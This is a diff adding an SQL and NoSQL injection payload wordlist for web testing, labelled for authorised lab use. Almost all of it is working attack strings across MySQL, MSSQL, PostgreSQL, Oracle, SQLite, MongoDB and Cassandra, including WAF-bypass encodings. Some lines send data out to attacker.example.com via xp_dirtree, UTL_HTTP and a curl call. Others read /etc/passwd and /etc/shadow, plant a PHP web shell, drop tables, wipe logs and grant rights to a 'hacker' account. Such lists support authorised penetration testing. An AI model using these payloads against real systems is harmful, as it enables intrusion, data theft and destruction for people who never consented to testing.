@@ -1,0 +1,417 @@
+# payloads/web/sqli.txt
+# SQL Injection detection payloads — AUTHORISED LAB USE ONLY
+# Advanced pentester edition — comprehensive coverage across all DBMS
+# Includes error-based, boolean, time-based, UNION, out-of-band, second-order,
+# WAF bypass, and DBMS-specific exploitation payloads.
+
+# ── Error-based probes ──────────────────────────────────────
+'
+"
+\
+')
+")
+'))
+"))
+` OR `1`=`1
+%00'
+%16'
+%bf%27
+%c0%80%27
+%c1%1c
+%c1%27
+%C0%AF
+%uff08
+\'
+\\'
+\\\
+\\\'
+%25%32%37
+%%2727
+' OR '1'='1' -- 
+' OR '1'='1' #
+' OR '1'='1' /*
+' OR 1=1 -- 
+' OR 1=1 #
+' OR 1=1 /*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+" OR "1"="1" -- 
+" OR 1=1 --
+') OR ('1'='1
+') OR (1=1)--
+')) OR (('1'=('1
+')) OR (1=1))--
+` OR 1=1 --
+' OR 'x'='x
+' OR 'x'='x'--
+' OR 'x'='x'#
+' OR 1=1 LIMIT 1--
+' OR 1=1 GROUP BY 1--
+' OR 1=1 ORDER BY 1--
+
+# ── Boolean-based (true condition) ──────────────────────────
+' AND '1'='1
+' AND '1'='1'--
+' AND '1'='1'#
+' AND 1=1--
+' AND 1=1#
+' AND 1=1/*
+" AND "1"="1
+" AND 1=1--
+1 AND 1=1
+1' AND '1'='1'--
+1' AND 1=1--
+1' AND 1=1 #
+' AND '1'='1' AND '1'='1
+' AND 1=1 AND 1=1--
+' AND 1=1 LIMIT 1--
+' AND 1=1 ORDER BY 1--
+' AND 1=1 GROUP BY 1--
+1 AND 1=1 UNION SELECT 1,2,3--
+' AND 1=1 AND MID(VERSION(),1,1)='M'--
+
+# ── Boolean-based (false condition — compare against true) ──
+' AND '1'='2
+' AND '1'='2'--
+' AND '1'='2'#
+' AND 1=2--
+' AND 1=2#
+' AND 1=2/*
+" AND "1"="2
+" AND 1=2--
+1 AND 1=2
+1' AND '1'='2'--
+1' AND 1=2--
+1' AND 1=2 #
+' AND '1'='2' AND '1'='2
+' AND 1=2 AND 1=2--
+' AND 1=2 LIMIT 1--
+1 AND 1=2 UNION SELECT 1,2,3--
+' AND 1=2 AND MID(VERSION(),1,1)='X'--
+
+# ── UNION-based detection ────────────────────────────────────
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+') UNION SELECT 1,2,3--
+')) UNION SELECT 1,2,3--
+1' UNION SELECT 1,2,3--
+1" UNION SELECT 1,2,3--
+1 UNION SELECT 1,2,3--
+1 UNION ALL SELECT 1,2,3--
+' UNION SELECT @@version,2,3--
+' UNION SELECT database(),2,3--
+' UNION SELECT user(),2,3--
+' UNION SELECT current_user,2,3--
+` UNION SELECT 1,2,3--
+1' UNION SELECT NULL,@@version,@@datadir-- -
+1' UNION SELECT NULL,database(),user()-- -
+1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+
+# ── Time-based (MySQL — SLEEP, BENCHMARK) ───────────────────
+' AND SLEEP(5)--
+' AND SLEEP(5) #
+" AND SLEEP(5)--
+1; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+' OR SLEEP(5) #
+' AND (SELECT * FROM (SELECT SLEEP(5))x)--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
+1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
+1 AND SLEEP(5)--
+' AND BENCHMARK(10000000,MD5('a'))--
+' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--
+1 AND BENCHMARK(10000000,MD5('a'))--
+' OR BENCHMARK(10000000,MD5('a'))--
+' OR 1=1 AND SLEEP(5)--
+' OR 1=1 # AND SLEEP(5)--
+%27%20AND%20SLEEP(5)%23
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+1' AND IF(1=1,SLEEP(5),0)--
+' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--
+' AND ELT(1,SLEEP(5))--
+1' AND ELT(1,SLEEP(5))--
+
+# ── Time-based (MSSQL — WAITFOR DELAY) ──────────────────────
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' OR WAITFOR DELAY '0:0:5'--
+' OR 1=1; WAITFOR DELAY '0:0:5'--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '00:00:05'--
+1 AND 1=1; WAITFOR DELAY '0:0:5'--
+1' AND 1=1; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+' OR 1=1 WAITFOR DELAY '0:0:5'--
+1' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+1; EXEC WAITFOR DELAY '0:0:5'--
+' OR 1=1 EXEC WAITFOR DELAY '0:0:5'--
+' AND 1=1 EXEC WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT COUNT(*) FROM sysobjects); WAITFOR DELAY '0:0:5'--
+' AND ASCII(SUBSTRING(@@version,1,1)) > 50; WAITFOR DELAY '0:0:5'--
+' AND (SELECT COUNT(*) FROM sysusers) > 0; WAITFOR DELAY '0:0:5'--
+
+# ── Time-based (PostgreSQL — pg_sleep) ──────────────────────
+'; SELECT pg_sleep(5)--
+' OR (SELECT * FROM pg_sleep(5))--
+' AND (SELECT * FROM pg_sleep(5))--
+1; SELECT pg_sleep(5)--
+1' AND 1=1; SELECT pg_sleep(5)--
+1 AND (SELECT * FROM pg_sleep(5))--
+' OR 1=1; SELECT pg_sleep(5)--
+' AND 1=1; SELECT pg_sleep(5)--
+' AND 1=(SELECT pg_sleep(5))--
+1' AND 1=(SELECT pg_sleep(5))--
+' UNION SELECT NULL FROM pg_sleep(5)--
+' UNION SELECT NULL,pg_sleep(5)--
+' UNION SELECT NULL,NULL,pg_sleep(5)--
+' AND EXISTS (SELECT 1 FROM pg_sleep(5))--
+' AND IF (1=1, (SELECT pg_sleep(5)), 'false')::text = 'true'--
+' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--
+1' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--
+
+# ── Time-based (Oracle — DBMS_PIPE.RECEIVE_MESSAGE) ────────
+' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))--
+' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_LOCK.SLEEP(5))--
+' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+1 AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))--
+' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))--
+' OR 1=1 AND (SELECT COUNT(*) FROM all_objects WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)) > 0--
+1' AND (SELECT COUNT(*) FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))>0--
+' OR (SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1) IS NOT NULL--
+1' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP(5)=0)--
+' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL) IS NOT NULL--
+
+# ── Out-of-band / DNS exfiltration (MySQL) ─────────────────
+' LOAD_FILE('\\\\attacker.example.com\\file')--
+' INTO OUTFILE '\\\\attacker.example.com\\output'--
+' UNION SELECT LOAD_FILE('\\\\attacker.example.com\\data')--
+1' UNION SELECT @@version INTO OUTFILE '\\\\attacker.example.com\\v.txt'--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(@@version),'.attacker.example.com\\test'))--
+
+# ── Out-of-band (MSSQL — xp_dirtree, xp_fileexist) ────────
+1; EXEC master..xp_dirtree '\\attacker.example.com\share'--
+1; EXEC master..xp_fileexist '\\attacker.example.com\share\file.txt'--
+1' OR 1=1; EXEC master..xp_dirtree '\\attacker.example.com\share'--
+'; DECLARE @q varchar(1024); SET @q='\\'+@@version+'.attacker.example.com\test'; EXEC master..xp_dirtree @q--
+1; EXEC master..xp_subdirs '\\attacker.example.com\share'--
+1' AND 1=1; EXEC master..xp_dirtree '\\attacker.example.com\share'--
+
+# ── Out-of-band (PostgreSQL — dblink, COPY) ────────────────
+' OR 1=1; COPY (SELECT @@version) TO PROGRAM 'curl http://attacker.example.com/'--
+1' AND 1=1; PERFORM dblink_send_query('connname','SELECT pg_sleep(5)')--
+' UNION SELECT dblink_connect('host=attacker.example.com dbname=test user=postgres')--
+1; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.example.com'--
+' OR 1=1; SELECT lo_export((SELECT encode(version(),'hex')), '/tmp/leak')--
+
+# ── Out-of-band (Oracle — UTL_HTTP, UTL_INADDR) ────────────
+' OR 1=1 AND UTL_HTTP.REQUEST('http://attacker.example.com/'||(SELECT user FROM DUAL))--
+1' AND 1=1 AND UTL_INADDR.GET_HOST_NAME('attacker.example.com')=1--
+' OR 1=1 AND UTL_HTTP.REQUEST('http://attacker.example.com/'||(SELECT banner FROM v$version WHERE rownum=1))--
+1' AND UTL_TCP.OPEN_CONNECTION('attacker.example.com',80,5000) IS NOT NULL--
+
+# ── Heavy query / DoS-safe detection (MySQL) ────────────────
+' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
+' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--
+1' AND (SELECT COUNT(*) FROM mysql.user A, mysql.user B, mysql.user C)--
+
+# ── Stacked queries ──────────────────────────────────────────
+'; DROP TABLE IF EXISTS test;--
+'; INSERT INTO users VALUES(1,'hacker','pw');--
+'; UPDATE users SET password='pwnd' WHERE id=1;--
+'; DELETE FROM logs WHERE 1=1;--
+'; SELECT 1; SELECT 2; SELECT 3;--
+'; CREATE TABLE hack(id INT);--
+'; ALTER TABLE users ADD COLUMN hack VARCHAR(100);--
+'; GRANT ALL ON *.* TO 'hacker'@'%' IDENTIFIED BY 'pw';--
+
+# ── MySQL WAF bypass variants ────────────────────────────────
+' OR 1=1-- -
+' OR 1=1#
+' OR 1=1/*!*/
+' OR /*!1=1*/--
+' OR 'test' LIKE 'te%'--
+' OR 1=1 UNION/**/SELECT/**/1,2,3--
+' OR 1=1 UNION%0aSELECT%0a1,2,3--
+' OR 1=1 UNION%0d%0aSELECT%0d%0a1,2,3--
+' OR 1=1 UNION/**/ALL/**/SELECT/**/1,2,3--
+' OR 1=1%09UNION%09ALL%09SELECT%091,2,3--
+' OR 1=1%0aUNION%0d%0aSELECT%0a1,2,3--
+' OR 1=1 AND 1=1 AND 1=1 AND 1=1--
+'/**/OR/**/1=1/**/--/**/
+' UN/**/ION SEL/**/ECT 1,2,3--
+' UNION(ELECT(1),(2),(3))--
+'%2F**%2FUNION%2F**%2FSELECT%2F**%2F1,2,3--
+' UNIunionON SELselectECT 1,2,3--
+' uni%6fn sele%63t 1,2,3--
+' \x55\x4e\x49\x4f\x4e SELECT 1,2,3--
+' OR 'abcd' LIKE '%25%25'--
+' OR 1=1 INTO OUTFILE '/dev/null'--
+1' AND 1=1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+' OR 1=1 UNION SELECT 1,2,3 INTO @a,@b,@c--
+' /*!50000OR*/ 1=1--
+
+# ── PostgreSQL WAF bypass variants ──────────────────────────
+' OR 1=1-- 
+' OR 1=1/*/ LIMIT 1--
+1' OR '1'='1'::text--
+1' UNION SELECT 1,2,3 LIMIT 1 OFFSET 0--
+1' UNION SELECT 1,2,3 OFFSET 0--
+1' UNION ALL SELECT 1,2,3 OFFSET 0--
+' UNION/**/SELECT/**/NULL,NULL,NULL--
+' UNION/*!SELECT*/NULL,NULL,NULL--
+' UNION%0aALL%0aSELECT%0a1,2,3--
+' UNION/*!99999SELECT*/1,2,3--
+1' OR 1=1; SELECT 1--
+
+# ── MSSQL WAF bypass variants ───────────────────────────────
+' OR 1=1-- 
+' OR 1=1/*/ 
+1' OR 1=1 UNION SELECT 1,2,3--
+1' OR 1=1 UNION ALL SELECT 1,2,3--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT 1,2,3 GROUP BY 1,2,3--
+1' OR 1=1; WITH cte AS (SELECT 1 AS a) SELECT a FROM cte--
+' OR 1=1 HAVING 1=1--
+1' OR 1=1 ORDER BY 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT @@servername,@@version,@@servicename--
+1' OR 1=1 UNION SELECT*FROM(SELECT 1)a JOIN(SELECT 2)b ON 1=1--
+
+# ── SQLite ──────────────────────────────────────────────────
+' OR 1=1--
+' OR '1'='1'--
+' UNION SELECT 1,2,3--
+' UNION SELECT sqlite_version(),2,3--
+' AND 1=1; SELECT sql FROM sqlite_master--
+' AND RANDOMBLOB(100000000)--
+1' AND RANDOMBLOB(50000000)--
+' UNION SELECT group_concat(tbl_name),2,3 FROM sqlite_master WHERE type='table'--
+
+# ── Blind conditional enumeration ───────────────────────────
+' AND (SELECT SUBSTRING(@@version,1,1))='M'--
+' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))>50--
+' AND ASCII(SUBSTRING((SELECT @@version),1,1))>77--
+' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 100--
+' AND (SELECT IF((SELECT SUBSTRING(@@version,1,1)='5'),SLEEP(3),0))--
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT user()),1,1))>100) THEN SLEEP(3) ELSE 0 END)--
+1' AND (SELECT MID((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,1))='a'--
+1' AND (SELECT ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100)--
+1' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database() AND table_name=0x7573657273 LIMIT 1)--
+
+# ── Comment-based detection ─────────────────────────────────
+'--
+'#
+'/*
+'--+
+'-- -
+'--%20
+'--+
+'--/**/
+'#
+%23
+%00
+/**/AND/**/1=1/**/--
+/**/OR/**/1=1/**/--
+
+# ── Second-order SQL injection (stored payloads) ────────────
+' OR '1'='1' -- (register this as username, trigger elsewhere)
+' OR '1'='1' # (store in profile field)
+' OR 1=1-- (stored in comment body)
+' UNION SELECT 'injected',2,3-- (stored in address field)
+
+# ── JSON-based (NoSQL injection variant) ────────────────────
+{\"$ne\": null}
+{\"$gt\": \"\"}
+{\"$regex\": \".*\"}
+{\"$where\": \"1==1\"}
+{\"$or\": [{\"a\":\"a\"}, {\"b\":\"b\"}]}
+username[$ne]=nonexistent&password[$ne]=nonexistent
+{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}
+
+# ── HTTP header-based injection ─────────────────────────────
+X-Forwarded-For: ' OR 1=1--
+User-Agent: ' OR SLEEP(5)--
+Referer: ' OR 1=1--
+Cookie: id=' OR '1'='1
+X-Forwarded-Host: ' UNION SELECT 1,2,3--
+X-Real-IP: ' OR 1=1--
+
+# ── XML-based (XPATH injection) ─────────────────────────────
+' OR '1'='1
+' OR 1=1 AND '1'='1
+' AND string-length(//user[1]/username/text())=5 AND '1'='1
+' AND substring(//user[1]/username/text(),1,1)='a' AND '1'='1
+
+# ── HPP (HTTP Parameter Pollution) ──────────────────────────
+?id=1&id=1' OR 1=1--
+?id=1&id=1' UNION SELECT 1,2,3--
+?id=1&id=1 AND SLEEP(5)--
+
+# ── NULL byte injection ──────────────────────────────────────
+%00' OR 1=1--
+%00' UNION SELECT 1,2,3--
+%00' AND SLEEP(5)--
+
+# ── Alternative encoding attacks ────────────────────────────
+%2557%254c%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%2531%252c%2532%252c%2533--
+%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33--
+%5c' OR 1=1--
+%%%32%37%20%4f%52%20%31%3d%31--
+
+# ── Case variation / SQL function abuse ─────────────────────
+' oR 1=1--
+' Or 1=1--
+' oR 1=1--
+' UNIunionON SELselectECT 1,2,3--
+' UnIoN SeLeCt 1,2,3--
+' unIon aLl sElEcT 1,2,3--
+1' uNion aLL sElEct @@versioN,2,3--
+' UNI\u004FN SEL\u0045CT 1,2,3--
+' UNI\x4fN SEL\x45CT 1,2,3--
+
+# ── Information_schema specific ─────────────────────────────
+1' UNION SELECT 1,group_concat(concat(TABLE_NAME,':',COLUMN_NAME)),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=database()--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name=0x7573657273--
+1' UNION SELECT 1,table_schema,3 FROM information_schema.tables--
+1' UNION SELECT 1,@@basedir,@@datadir,@@version_compile_os--
+
+# ── READ / WRITE file (MySQL — FILE privilege) ─────────────
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('C:/Windows/win.ini')--
+' UNION SELECT LOAD_FILE('C:/boot.ini')--
+1' UNION SELECT LOAD_FILE(0x2F6574632F706173737764)--
+' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["c"]); ?>'--
+' INTO DUMPFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["c"]); ?>'--
+
+# ── MongoDB NoSQL injection (alternative comment format) ───
+' && 1==1//
+' && this.password.match(/.*/)//
+' || 1==1//
+?username[$regex]=.*&password[$regex]=.*
+?username[$ne]=null&password[$ne]=null
+' && this.constructor.constructor('return 1')()//
+{\"username\": {\"$exists\": true}, \"password\": {\"$exists\": true}}
+' && (this.role === 'admin') || true//
+
+# ── CQL (Cassandra) injection ───────────────────────────────
+' OR '1'='1' ALLOW FILTERING--
+' OR 1=1 ALLOW FILTERING--
+' OR '1'='1'--
+' UNION SELECT 1,2,3 FROM system.schema_columns--
+' OR '1'='1' USING TTL 3600--
